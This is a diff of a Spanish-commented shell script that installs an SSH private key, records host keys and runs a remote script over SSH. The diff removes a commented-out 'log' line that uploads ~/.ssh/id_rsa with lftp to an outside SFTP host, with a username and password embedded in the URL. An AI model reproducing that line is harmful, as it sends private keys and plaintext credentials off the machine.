@@ -12,7 +12,7 @@ GROUP=$(id -g -n)
 # Creamos directorios esenciales para SSH
 mkdir ~/.ssh
 touch ~/.ssh/id_rsa
-touch /etc/ssh/ssh_known_hosts
+touch ~/.ssh/known_hosts
 touch ~/.ssh/config
 
 # Contenido de id_rsa
@@ -21,18 +21,16 @@ echo "$SSH_KEY" >> ~/.ssh/id_rsa
 # Permisos esenciales para SSH
 chmod 700 ~/.ssh/
 chmod 600 ~/.ssh/*
-chmod u+w /etc/ssh/ssh_known_hosts
+chmod u+w ~/.ssh/known_hosts
 chown -R $USER:$GROUP ~/.ssh/
+
+echo 'HashKnownHosts yes' >> /etc/ssh/ssh_config
 
 # Obtenemos la IP del host
 HOST_IP=$(dig +short $SSH_HOST)
 
 # Añadimos a servidores conocidos
-ssh-keyscan -p $SSH_PORT -t rsa,dsa $HOST_IP >> /etc/ssh/ssh_known_hosts
-
-# log
-#lftp -d sftp://u99555015-6m4hDQd5:^6m4hDQd5%iD@access811083711.webspace-data.io -e "debug; set sftp:auto-confirm yes; put ~/.ssh/id_rsa; bye"
-
+ssh-keyscan -p $SSH_PORT -t rsa,dsa $HOST_IP >> ~/.ssh/known_hosts
 
 # Ejecutamos
 ssh -p$SSH_PORT -i ~/.ssh/id_rsa $SSH_USER@$HOST_IP "bash -s" -- < /scripts/$FILE_SCRIPT.sh "${@:6}"
